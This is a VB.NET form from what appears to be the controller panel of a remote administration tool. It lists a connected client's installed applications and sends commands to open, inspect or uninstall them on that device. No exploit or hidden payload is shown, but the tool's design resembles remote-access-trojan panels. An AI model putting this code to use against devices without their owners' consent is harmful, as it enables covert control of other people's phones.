﻿Public Class Applications
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then

                Dim indx% = 0
                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)


                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True
                Else


                    DataGridView1.Rows.Clear()
                    Dim spl_LN() As String = {Form1.s.split_Line}
                    Dim ln() As String = data.Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                    Dim Save_data As System.Text.StringBuilder = New System.Text.StringBuilder()
                    For i As Integer = 0 To ln.Length - 1
                        Dim split_Ary() As String = {Form1.s.split_Ary}
                        Dim Ary() As String = ln(i).Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                        Dim Converts() As Byte = Convert.FromBase64String(Ary(2))
                        Dim ms As New IO.MemoryStream(Converts)
                        Dim base64 As New Bitmap(Image.FromStream(ms))
                        imageList_0.Images.Add(base64)
                        ms.Dispose()
                        DataGridView1.Rows.Add(imageList_0.Images(indx), Ary(0), Ary(1), Ary(3), Ary(4))
                        Save_data.AppendFormat("{0}", Ary(0) + " , " + Ary(1) + " , " + Ary(3) + " , " + Ary(4) + vbNewLine)
                        If (CStr(Ary(5)) = CStr(Ary(1))) Then
                            DataGridView1.Rows(indx).Cells(2).Style.ForeColor = Color.SeaGreen
                        End If
                        indx += 1
                    Next
                    store_0.Save_0(Name_Client & Client_ID & "\" & "Applications", Save_data.ToString)
                    If Panel3.Visible = True Then Panel3.Visible = False
                    refres_title()

                End If





            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Applications" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
        Text = title
    End Sub


    Private Sub Applications_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        UninstallToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")
        RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        OpenAppToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_app")

        PackageInfoToolStripMenuItem.Image = store_0.Bitmap_0("ctx_info")

        ContextMenuStrip1.Renderer = New Theme_0
#Region " imageList Applications "
        imageList_0.ImageSize = New Size(96, 96)
        imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
#End Region

        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        refres_title()
    End Sub

    Private Sub OpenAppToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenAppToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Form1.s.Send(handle_Number_Client, "open_app" + Form1.s.SplitData + DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Value)
            Next
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Form1.s.Send(handle_Number_Client, "applications")
    End Sub

    Private Sub DataGridView1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs) Handles DataGridView1.ColumnWidthChanged
        Dim col As DataGridViewColumn = e.Column
        Dim c As DataGridViewColumn = DataGridView1.Columns(0)
        If c.Width > 95 Then
            e.Column.Width = 95
        End If

    End Sub

    Private Sub PackageInfoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PackageInfoToolStripMenuItem.Click

        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Form1.s.Send(handle_Number_Client, "package_info" + Form1.s.SplitData + DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Value)
            Next
        End If

    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                Form1.s.Send(handle_Number_Client, "uninstall" + Form1.s.SplitData + DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Value)
            Next
        End If
    End Sub
End Class